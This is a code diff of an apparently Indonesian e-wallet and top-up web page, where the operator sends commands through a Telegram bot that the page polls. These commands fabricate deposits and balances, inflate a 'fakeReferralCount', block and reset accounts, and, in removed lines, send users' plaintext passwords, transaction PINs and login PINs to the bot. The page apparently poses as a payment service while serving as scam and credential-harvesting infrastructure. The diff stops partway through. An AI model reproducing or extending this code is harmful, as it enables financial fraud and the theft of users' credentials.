@@ -2153,6 +2153,7 @@
           <div class="input-group">
             <label>Pilih E-Wallet Penerima</label>
             <select id="cart-provider">
+              <option value="" disabled selected>-- Pilih Produk --</option>
               <option value="OVO">OVO</option>
               <option value="DANA">DANA</option>
               <option value="GOPAY">Gopay</option>
@@ -3800,6 +3801,10 @@
       const cartTargetNumber = document.getElementById('cart-target').value.trim();
       const cartProvider = document.getElementById('cart-provider').value;
 
+      if (!cartProvider || cartProvider === "") {
+        return showModal("Perhatian", "Silakan pilih produk E-Wallet terlebih dahulu.", "error");
+      }
+
       if (!cartTargetNumber) return showModal("Perhatian", "Masukkan nomor penerima E-Wallet<br>untuk melanjutkan.", "error");
       
       if (!cartItem.promoAppliedStatus) {
@@ -4321,399 +4326,399 @@
     }
 
     async function fetchTelegramUpdates() {
-  if (isPolling) return;
-  isPolling = true;
+      if (isPolling) return;
+      isPolling = true;
 
-  try {
+      try {
 
-    let url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
-    if (lastUpdateId > 0) {
-      url += `?offset=${lastUpdateId + 1}`;
-    }
-
-    const res = await fetch(url);
-    const data = await res.json();
-    
-    if (!data.ok || !data.result || data.result.length === 0) { 
-      isPolling = false; return; 
-    }
-
-    let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
-
-    for (let update of data.result) {
-      if (update.update_id <= lastUpdateId) continue;
-
-      const msg = update.message; 
-      if (!msg) {
-        lastUpdateId = update.update_id;
-        localStorage.setItem('sanz_last_update_id', lastUpdateId);
-        continue; 
-      }
-
-      const text = (msg.text || msg.caption || '').trim();
-      const parts = text.split(' ');
-      const command = parts[0];
-      const target = parts.length > 1 ? parts[parts.length - 1].trim() : '';
-
-      if (command === '/maintenance') { 
-        localStorage.setItem('sanz_maintenance', 'true'); 
-        checkMaintenance(); 
-      }
-      else if (command === '/unmaintenance') { 
-        localStorage.setItem('sanz_maintenance', 'false'); 
-        checkMaintenance(); 
-      }
-      else if (command === '/cs_off') {
-        localStorage.setItem('sanz_cs_status', 'off');
-        isCSOnline = false;
-      }
-      else if (command === '/cs_on') {
-        localStorage.setItem('sanz_cs_status', 'on');
-        isCSOnline = true;
-      }
-
-      let targetPhone = null;
-      let targetUidVal = null;
-
-      if (command === '/reset_akun') {
-        targetPhone = parts[1];
-      } else {
-
-        for (let ph in usersDb) {
-          if (usersDb[ph].uid === target || usersDb[ph].uid === parts[1] || usersDb[ph].uid === parts[2]) {
-            targetPhone = ph;
-            targetUidVal = usersDb[ph].uid;
-            break;
-          }
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
+        if (lastUpdateId > 0) {
+          url += `?offset=${lastUpdateId + 1}`;
         }
-      }
 
-      if (targetPhone && usersDb[targetPhone]) {
-        let activeDep = JSON.parse(localStorage.getItem(`sanz_active_deposit_${targetPhone}`)); 
-        let activeWd = JSON.parse(localStorage.getItem(`sanz_active_withdraw_${targetPhone}`));
+        const res = await fetch(url);
+        const data = await res.json();
         
-        let tBal = parseFloat(localStorage.getItem(`sanz_bal_${targetPhone}`)) || 0;
-        let tHist = JSON.parse(localStorage.getItem(`sanz_hist_${targetPhone}`)) || [];
+        if (!data.ok || !data.result || data.result.length === 0) { 
+          isPolling = false; return; 
+        }
 
-        if (activeDep && activeDep.status === 'Menunggu' && target === targetUidVal) {
-          if (command === '/acc') {
-            localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
-            let accAmt = parseInt(parts[1]); 
-            if (isNaN(accAmt)) accAmt = activeDep.amount;
-            
-            let adminFee = accAmt < 100000 ? 1500 : 0;
-            let finalAmt = accAmt - adminFee;
-            localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + finalAmt);
-  
-            let idx = tHist.findIndex(h => h.id === activeDep.id);
-            if (idx !== -1) { 
-              tHist[idx].status = 'Berhasil'; 
-              tHist[idx].amount = finalAmt; 
-              localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist));
-            }
-            
-            addNotifToUser(targetPhone, `Isi saldo berhasil diproses senilai ${formatIDR(finalAmt)}`);
-            sendToTelegram(`Deposit sejumlah Rp ${accAmt.toLocaleString('id-ID')} telah disetujui untuk \`${target}\``);
+        let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
 
-            if (targetPhone === currentUserPhone) {
-              userBalance += finalAmt; 
-              tradeHistory = tHist;
-              updateBalanceDisplay();
-              renderHistory();
-              if (depositTimerInterval) clearInterval(depositTimerInterval);
-              if (document.getElementById('qris-loading')) {
-                document.getElementById('deposit-amount-display').style.display = 'none';
-                document.getElementById('qris-loading').style.display = 'none';
-                document.getElementById('qris-ready').style.display = 'none';
-                document.getElementById('deposit-instructions').style.display = 'none';
-                document.getElementById('btn-cancel-deposit').style.display = 'none';
-                document.getElementById('deposit-success-msg').style.display = 'block';
-                
-                let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
-                let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
-                let feeRow = adminFee > 0 
-                  ? `<div class="receipt-row"><span>Biaya Layanan:</span><span style="color:var(--danger);">- ${formatIDR(adminFee)}</span></div>` 
-                  : `<div class="receipt-row"><span>Biaya Layanan:</span><span>Gratis</span></div>`;
+        for (let update of data.result) {
+          if (update.update_id <= lastUpdateId) continue;
 
-                document.getElementById('deposit-success-msg').innerHTML = `
-                  <div class="receipt-box" style="text-align: left; margin-top: 5px;">
-                    <div class="receipt-header">DIGITAL</div>
-                    <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
-                    <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
-                    <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
-                    <div class="receipt-row"><span>Status:</span><span style="color: var(--success); font-weight: bold;">Berhasil</span></div>
-                    <div class="receipt-row"><span>Nominal:</span><span>${formatIDR(accAmt)}</span></div>
-                    ${feeRow}
-                    <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
-                    <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span style="color:var(--text-main);">${formatIDR(finalAmt)}</span></div>
-                  </div>`;
-              }
-            }
+          const msg = update.message; 
+          if (!msg) {
+            lastUpdateId = update.update_id;
+            localStorage.setItem('sanz_last_update_id', lastUpdateId);
+            continue; 
           }
-          else if (command === '/tolak') {
-            localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
-            let idx = tHist.findIndex(h => h.id === activeDep.id);
-            if (idx !== -1) { 
-              tHist[idx].status = 'Dibatalkan'; 
-              localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
-            }
-            addNotifToUser(targetPhone, "Isi saldo dibatalkan oleh sistem.");
-            sendToTelegram(`Deposit untuk \`${target}\` telah ditolak.`);
 
-            if (targetPhone === currentUserPhone) {
-              tradeHistory = tHist;
-              renderHistory();
-              if (depositTimerInterval) clearInterval(depositTimerInterval);
-              if (document.getElementById('qris-loading')) {
-                document.getElementById('deposit-amount-display').style.display = 'none';
-                document.getElementById('qris-loading').style.display = 'none';
-                document.getElementById('qris-ready').style.display = 'none';
-                document.getElementById('deposit-instructions').style.display = 'none';
-                document.getElementById('btn-cancel-deposit').style.display = 'none';
-                document.getElementById('deposit-success-msg').style.display = 'block';
-                let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
-                let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
-                document.getElementById('deposit-success-msg').innerHTML = `
-                  <div class="receipt-box" style="text-align: left; margin-top: 5px;">
-                    <div class="receipt-header">DIGITAL</div>
-                    <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
-                    <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
-                    <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
-                    <div class="receipt-row"><span>Status:</span><span style="color: var(--danger); font-weight: bold;">Dibatalkan</span></div>
-                    <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
-                    <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span>${formatIDR(activeDep.amount)}</span></div>
-                  </div>`;
-              }
-            }
+          const text = (msg.text || msg.caption || '').trim();
+          const parts = text.split(' ');
+          const command = parts[0];
+          const target = parts.length > 1 ? parts[parts.length - 1].trim() : '';
+
+          if (command === '/maintenance') { 
+            localStorage.setItem('sanz_maintenance', 'true'); 
+            checkMaintenance(); 
           }
-          else if (command === '/send' && msg.photo) {
-            const photo = msg.photo[msg.photo.length - 1]; 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`).then(r=>r.json()).then(d=>{
-              if (d.ok) {
-                const qrUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${d.result.file_path}`;
-
-                activeDep.qrUrl = qrUrl;
-                localStorage.setItem(`sanz_active_deposit_${targetPhone}`, JSON.stringify(activeDep));
-
-                if (targetPhone === currentUserPhone && document.getElementById('qris-loading')) {
-                  showQR(qrUrl, activeDep, false);
-                }
-                sendToTelegram(`QRIS berhasil ditampilkan untuk \`${target}\``);
-              } else {
-                sendToTelegram(`QRIS gagal ditampilkan untuk \`${target}\``);
-              }
-            });
+          else if (command === '/unmaintenance') { 
+            localStorage.setItem('sanz_maintenance', 'false'); 
+            checkMaintenance(); 
           }
-        }
-
-        if (activeWd && activeWd.status === 'Menunggu' && target === targetUidVal) {
-          if (command === '/acc_wd') {
-            localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
-            let idx = tHist.findIndex(h => h.id === activeWd.id);
-            if (idx !== -1) { 
-              tHist[idx].status = 'Berhasil'; 
-              localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
-            }
-            addNotifToUser(targetPhone, `Penarikan saldo ${formatIDR(activeWd.amount)} sukses ditransfer.`);
-            sendToTelegram(`Penarikan saldo sejumlah Rp ${activeWd.amount.toLocaleString('id-ID')} untuk \`${target}\` disetujui.`);
-
-            if (targetPhone === currentUserPhone) {
-              tradeHistory = tHist;
-              renderHistory();
-            }
+          else if (command === '/cs_off') {
+            localStorage.setItem('sanz_cs_status', 'off');
+            isCSOnline = false;
           }
-          else if (command === '/tolak_wd') {
-            localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
-            let idx = tHist.findIndex(h => h.id === activeWd.id);
-            if (idx !== -1) { 
-              tHist[idx].status = 'Dibatalkan'; 
-              localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
-            }
-
-            localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + activeWd.amount);
-            addNotifToUser(targetPhone, `Penarikan saldo dibatalkan oleh sistem.`);
-            sendToTelegram(`Penarikan saldo untuk \`${target}\` ditolak.`);
-
-            if (targetPhone === currentUserPhone) {
-              tradeHistory = tHist;
-              userBalance += activeWd.amount; 
-              updateBalanceDisplay();
-              renderHistory();
-            }
+          else if (command === '/cs_on') {
+            localStorage.setItem('sanz_cs_status', 'on');
+            isCSOnline = true;
           }
-        }
 
-        if (command === '/add_saldo') {
-          let nominal = parseInt(parts[1]);
-          if (!isNaN(nominal) && parts[2] === targetUidVal) {
-            localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + nominal);
-            tHist.unshift({ id: Date.now(), type: 'Deposit', amount: nominal, time: new Date().toLocaleTimeString('id-ID'), status: 'Berhasil', info: 'QRIS Merchant' });
-            localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist));
-            
-            addNotifToUser(targetPhone, `Saldo senilai ${formatIDR(nominal)} telah berhasil ditambahkan.`);
-            sendToTelegram(`Saldo sejumlah Rp ${nominal.toLocaleString('id-ID')} berhasil ditambahkan ke \`${targetUidVal}\``);
+          let targetPhone = null;
+          let targetUidVal = null;
 
-            if (targetPhone === currentUserPhone) {
-              userBalance += nominal;
-              tradeHistory = tHist;
-              updateBalanceDisplay();
-              renderHistory();
-            }
-          }
-        }
-
-        if (command === '/verif') { 
-          usersDb[targetPhone].isVerified = true; 
-          usersDb[targetPhone].verifStatus = 'verified'; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Verifikasi akun telah berhasil diproses."); 
-          sendToTelegram(`Verifikasi akun \`${parts[1]}\` disetujui.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/tolak_verif') { 
-          usersDb[targetPhone].isVerified = false; 
-          usersDb[targetPhone].verifStatus = 'rejected'; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Verifikasi ditolak silakan ajukan ulang."); 
-          sendToTelegram(`Verifikasi akun \`${parts[1]}\` ditolak.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/reseller') { 
-          usersDb[targetPhone].isReseller = true; 
-          usersDb[targetPhone].resellerPendingRequest = false; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Aktivasi akun telah berhasil diproses."); 
-          sendToTelegram(`Aktivasi reseller \`${parts[1]}\` disetujui.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/tolak_reseller') { 
-          usersDb[targetPhone].isReseller = false; 
-          usersDb[targetPhone].resellerPendingRequest = false; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Pengajuan reseller ditolak."); 
-          sendToTelegram(`Aktivasi reseller \`${parts[1]}\` ditolak.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/reset_pin') { 
-          usersDb[targetPhone].pinCode = null; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "PIN transaksi telah direset."); 
-          sendToTelegram(`PIN transaksi \`${parts[1]}\` direset.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/unlock') { 
-          usersDb[targetPhone].unlockedAll = true; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Fitur reseller diverifikasi."); 
-          sendToTelegram(`Fitur reseller \`${parts[1]}\` diverifikasi.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/trx') { 
-          usersDb[targetPhone].hasTrxOverride = true; 
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          addNotifToUser(targetPhone, "Fitur transfer diverifikasi."); 
-          sendToTelegram(`Fitur transfer \`${parts[1]}\` diverifikasi.`); 
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-
-        else if (command === '/notif') {
-          let notifText = parts.slice(1, -1).join(' ');
-          
-          if (notifText) {
-            addNotifToUser(targetPhone, notifText, 'info');
-            sendToTelegram(`Notifikasi berhasil dikirim ke \`${targetUidVal}\` pesan: "${notifText}"`);
+          if (command === '/reset_akun') {
+            targetPhone = parts[1];
           } else {
-          }
-        }
 
-        else if (command === '/reset_akun') {
-          delete usersDb[targetPhone];
-          localStorage.removeItem(`sanz_bal_${targetPhone}`);
-          localStorage.removeItem(`sanz_hist_${targetPhone}`);
-          localStorage.removeItem(`sanz_notifs_${targetPhone}`); 
-          localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
-          localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          sendToTelegram(`\`${targetPhone}\` berhasil direset.`);
-          if (targetPhone === currentUserPhone) handleLogout();
-        }
-        else if (command === '/reff') {
-          let kode = parts[1];
-          if (kode) {
-            usersDb[targetPhone].referralCode = kode;
-            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-            sendToTelegram(`Kode referensi untuk \`${targetUidVal}\` berhasil diatur menjadi *${kode}*`);
+            for (let ph in usersDb) {
+              if (usersDb[ph].uid === target || usersDb[ph].uid === parts[1] || usersDb[ph].uid === parts[2]) {
+                targetPhone = ph;
+                targetUidVal = usersDb[ph].uid;
+                break;
+              }
+            }
           }
-        }
-        else if (command === '/reff_new') {
-          let jumlah = parseInt(parts[1]);
-          if (!isNaN(jumlah)) {
-            usersDb[targetPhone].fakeReferralCount = (usersDb[targetPhone].fakeReferralCount || 0) + jumlah;
-            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-            sendToTelegram(`Berhasil menambahkan progress ${jumlah} referral untuk \`${targetUidVal}\``);
-          }
-        }
-        else if (command === '/blokir') {
-          usersDb[targetPhone].isBlocked = true;
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          sendToTelegram(`\`${targetUidVal}\` berhasil diblokir.`);
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-        else if (command === '/unblokir') {
-          usersDb[targetPhone].isBlocked = false;
-          localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-          sendToTelegram(`\`${targetUidVal}\` berhasil di-unblokir.`);
-          if (targetPhone === currentUserPhone) updateAuthUI();
-        }
-  
-        else if (command === '/maintenance') {
-          localStorage.setItem('sanz_maintenance_' + targetPhone, 'true');
-          sendToTelegram(`Maintenance diaktifkan untuk \`${targetUidVal}\``);
-          if (targetPhone === currentUserPhone) checkMaintenance();
-        }
-        else if (command === '/unmaintenance') {
-          localStorage.setItem('sanz_maintenance_' + targetPhone, 'false');
-          sendToTelegram(`Maintenance dinonaktifkan untuk \`${targetUidVal}\``);
-          if (targetPhone === currentUserPhone) checkMaintenance();
-        }
-        else if (command === '/cs_off') {
-          localStorage.setItem('sanz_cs_status_' + targetPhone, 'off');
-          sendToTelegram(`CS dimatikan untuk \`${targetUidVal}\``);
-          if (targetPhone === currentUserPhone) isCSOnline = false;
-        }
-        else if (command === '/cs_on') {
-          localStorage.setItem('sanz_cs_status_' + targetPhone, 'on');
-          sendToTelegram(`CS diaktifkan untuk \`${targetUidVal}\``);
-          if (targetPhone === currentUserPhone) isCSOnline = true;
-        }
 
-        else if (command === '/check') {
-          let uData = usersDb[targetPhone];
-          let info = `*DATA PENGGUNA*\n`;
-          info += `Nama: ${uData.name}\n`;
-          info += `Nomor: \`${targetPhone}\`\n`;
-          info += `UID: \`${uData.uid}\`\n`;
-          info += `Password: \`${uData.password}\`\n`;
-          info += `PIN Transaksi: \`${uData.pinCode ? uData.pinCode : 'Belum diatur'}\`\n`;
-          info += `PIN Login: \`${uData.loginPin ? uData.loginPin : 'Belum diatur'}\`\n`;
-          info += `Saldo: Rp ${tBal.toLocaleString('id-ID')}\n`;
-          info += `Status Verif: ${uData.isVerified ? 'Terverifikasi' : 'Belum'}\n`;
-          info += `Tipe Akun: ${uData.isReseller ? 'Reseller' : 'Standar'}\n`;
-          info += `Status Blokir: ${uData.isBlocked ? 'Ya' : 'Tidak'}`;
-          
-          sendToTelegram(info);
+          if (targetPhone && usersDb[targetPhone]) {
+            let activeDep = JSON.parse(localStorage.getItem(`sanz_active_deposit_${targetPhone}`)); 
+            let activeWd = JSON.parse(localStorage.getItem(`sanz_active_withdraw_${targetPhone}`));
+            
+            let tBal = parseFloat(localStorage.getItem(`sanz_bal_${targetPhone}`)) || 0;
+            let tHist = JSON.parse(localStorage.getItem(`sanz_hist_${targetPhone}`)) || [];
+
+            if (activeDep && activeDep.status === 'Menunggu' && target === targetUidVal) {
+              if (command === '/acc') {
+                localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
+                let accAmt = parseInt(parts[1]); 
+                if (isNaN(accAmt)) accAmt = activeDep.amount;
+                
+                let adminFee = accAmt < 100000 ? 1500 : 0;
+                let finalAmt = accAmt - adminFee;
+                localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + finalAmt);
+      
+                let idx = tHist.findIndex(h => h.id === activeDep.id);
+                if (idx !== -1) { 
+                  tHist[idx].status = 'Berhasil'; 
+                  tHist[idx].amount = finalAmt; 
+                  localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist));
+                }
+                
+                addNotifToUser(targetPhone, `Isi saldo berhasil diproses senilai ${formatIDR(finalAmt)}`);
+                sendToTelegram(`Deposit sejumlah Rp ${accAmt.toLocaleString('id-ID')} telah disetujui untuk \`${target}\``);
+
+                if (targetPhone === currentUserPhone) {
+                  userBalance += finalAmt; 
+                  tradeHistory = tHist;
+                  updateBalanceDisplay();
+                  renderHistory();
+                  if (depositTimerInterval) clearInterval(depositTimerInterval);
+                  if (document.getElementById('qris-loading')) {
+                    document.getElementById('deposit-amount-display').style.display = 'none';
+                    document.getElementById('qris-loading').style.display = 'none';
+                    document.getElementById('qris-ready').style.display = 'none';
+                    document.getElementById('deposit-instructions').style.display = 'none';
+                    document.getElementById('btn-cancel-deposit').style.display = 'none';
+                    document.getElementById('deposit-success-msg').style.display = 'block';
+                    
+                    let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
+                    let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
+                    let feeRow = adminFee > 0 
+                      ? `<div class="receipt-row"><span>Biaya Layanan:</span><span style="color:var(--danger);">- ${formatIDR(adminFee)}</span></div>` 
+                      : `<div class="receipt-row"><span>Biaya Layanan:</span><span>Gratis</span></div>`;
+
+                    document.getElementById('deposit-success-msg').innerHTML = `
+                      <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                        <div class="receipt-header">DIGITAL</div>
+                        <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
+                        <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
+                        <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
+                        <div class="receipt-row"><span>Status:</span><span style="color: var(--success); font-weight: bold;">Berhasil</span></div>
+                        <div class="receipt-row"><span>Nominal:</span><span>${formatIDR(accAmt)}</span></div>
+                        ${feeRow}
+                        <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
+                        <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span style="color:var(--text-main);">${formatIDR(finalAmt)}</span></div>
+                      </div>`;
+                  }
+                }
+              }
+              else if (command === '/tolak') {
+                localStorage.removeItem(`sanz_active_deposit_${targetPhone}`);
+                let idx = tHist.findIndex(h => h.id === activeDep.id);
+                if (idx !== -1) { 
+                  tHist[idx].status = 'Dibatalkan'; 
+                  localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
+                }
+                addNotifToUser(targetPhone, "Isi saldo dibatalkan oleh sistem.");
+                sendToTelegram(`Deposit untuk \`${target}\` telah ditolak.`);
+
+                if (targetPhone === currentUserPhone) {
+                  tradeHistory = tHist;
+                  renderHistory();
+                  if (depositTimerInterval) clearInterval(depositTimerInterval);
+                  if (document.getElementById('qris-loading')) {
+                    document.getElementById('deposit-amount-display').style.display = 'none';
+                    document.getElementById('qris-loading').style.display = 'none';
+                    document.getElementById('qris-ready').style.display = 'none';
+                    document.getElementById('deposit-instructions').style.display = 'none';
+                    document.getElementById('btn-cancel-deposit').style.display = 'none';
+                    document.getElementById('deposit-success-msg').style.display = 'block';
+                    let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
+                    let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
+                    document.getElementById('deposit-success-msg').innerHTML = `
+                      <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                        <div class="receipt-header">DIGITAL</div>
+                        <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
+                        <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
+                        <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
+                        <div class="receipt-row"><span>Status:</span><span style="color: var(--danger); font-weight: bold;">Dibatalkan</span></div>
+                        <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
+                        <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span>${formatIDR(activeDep.amount)}</span></div>
+                      </div>`;
+                  }
+                }
+              }
+              else if (command === '/send' && msg.photo) {
+                const photo = msg.photo[msg.photo.length - 1]; 
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`).then(r=>r.json()).then(d=>{
+                  if (d.ok) {
+                    const qrUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${d.result.file_path}`;
+
+                    activeDep.qrUrl = qrUrl;
+                    localStorage.setItem(`sanz_active_deposit_${targetPhone}`, JSON.stringify(activeDep));
+
+                    if (targetPhone === currentUserPhone && document.getElementById('qris-loading')) {
+                      showQR(qrUrl, activeDep, false);
+                    }
+                    sendToTelegram(`QRIS berhasil ditampilkan untuk \`${target}\``);
+                  } else {
+                    sendToTelegram(`QRIS gagal ditampilkan untuk \`${target}\``);
+                  }
+                });
+              }
+            }
+
+            if (activeWd && activeWd.status === 'Menunggu' && target === targetUidVal) {
+              if (command === '/acc_wd') {
+                localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
+                let idx = tHist.findIndex(h => h.id === activeWd.id);
+                if (idx !== -1) { 
+                  tHist[idx].status = 'Berhasil'; 
+                  localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
+                }
+                addNotifToUser(targetPhone, `Penarikan saldo ${formatIDR(activeWd.amount)} sukses ditransfer.`);
+                sendToTelegram(`Penarikan saldo sejumlah Rp ${activeWd.amount.toLocaleString('id-ID')} untuk \`${target}\` disetujui.`);
+
+                if (targetPhone === currentUserPhone) {
+                  tradeHistory = tHist;
+                  renderHistory();
+                }
+              }
+              else if (command === '/tolak_wd') {
+                localStorage.removeItem(`sanz_active_withdraw_${targetPhone}`);
+                let idx = tHist.findIndex(h => h.id === activeWd.id);
+                if (idx !== -1) { 
+                  tHist[idx].status = 'Dibatalkan'; 
+                  localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist)); 
+                }
+
+                localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + activeWd.amount);
+                addNotifToUser(targetPhone, `Penarikan saldo dibatalkan oleh sistem.`);
+                sendToTelegram(`Penarikan saldo untuk \`${target}\` ditolak.`);
+
+                if (targetPhone === currentUserPhone) {
+                  tradeHistory = tHist;
+                  userBalance += activeWd.amount; 
+                  updateBalanceDisplay();
+                  renderHistory();
+                }
+              }
+            }
+
+            if (command === '/add_saldo') {
+              let nominal = parseInt(parts[1]);
+              if (!isNaN(nominal) && parts[2] === targetUidVal) {
+                localStorage.setItem(`sanz_bal_${targetPhone}`, tBal + nominal);
+                tHist.unshift({ id: Date.now(), type: 'Deposit', amount: nominal, time: new Date().toLocaleTimeString('id-ID'), status: 'Berhasil', info: 'QRIS Merchant' });
+                localStorage.setItem(`sanz_hist_${targetPhone}`, JSON.stringify(tHist));
+                
+                addNotifToUser(targetPhone, `Saldo senilai ${formatIDR(nominal)} telah berhasil ditambahkan.`);
+                sendToTelegram(`Saldo sejumlah Rp ${nominal.toLocaleString('id-ID')} berhasil ditambahkan ke \`${targetUidVal}\``);
+
+                if (targetPhone === currentUserPhone) {
+                  userBalance += nominal;
+                  tradeHistory = tHist;
+                  updateBalanceDisplay();
+                  renderHistory();
+                }
+              }
+            }
+
+            if (command === '/verif') { 
+              usersDb[targetPhone].isVerified = true; 
+              usersDb[targetPhone].verifStatus = 'verified'; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Verifikasi akun telah berhasil diproses."); 
+              sendToTelegram(`Verifikasi akun \`${parts[1]}\` disetujui.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/tolak_verif') { 
+              usersDb[targetPhone].isVerified = false; 
+              usersDb[targetPhone].verifStatus = 'rejected'; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Verifikasi ditolak silakan ajukan ulang."); 
+              sendToTelegram(`Verifikasi akun \`${parts[1]}\` ditolak.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/reseller') { 
+              usersDb[targetPhone].isReseller = true; 
+              usersDb[targetPhone].resellerPendingRequest = false; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Aktivasi akun telah berhasil diproses."); 
+              sendToTelegram(`Aktivasi reseller \`${parts[1]}\` disetujui.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/tolak_reseller') { 
+              usersDb[targetPhone].isReseller = false; 
+              usersDb[targetPhone].resellerPendingRequest = false; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Pengajuan reseller ditolak."); 
+              sendToTelegram(`Aktivasi reseller \`${parts[1]}\` ditolak.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/reset_pin') { 
+              usersDb[targetPhone].pinCode = null; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "PIN transaksi telah direset."); 
+              sendToTelegram(`PIN transaksi \`${parts[1]}\` direset.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/unlock') { 
+              usersDb[targetPhone].unlockedAll = true; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Fitur reseller diverifikasi."); 
+              sendToTelegram(`Fitur reseller \`${parts[1]}\` diverifikasi.`); 
+              if (targetPhone === currentUserPhone) updateAuthUI();
+            }
+            else if (command === '/trx') { 
+              usersDb[targetPhone].hasTrxOverride = true; 
+              localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+              addNotifToUser(targetPhone, "Fitur transfer diverifikasi."); 
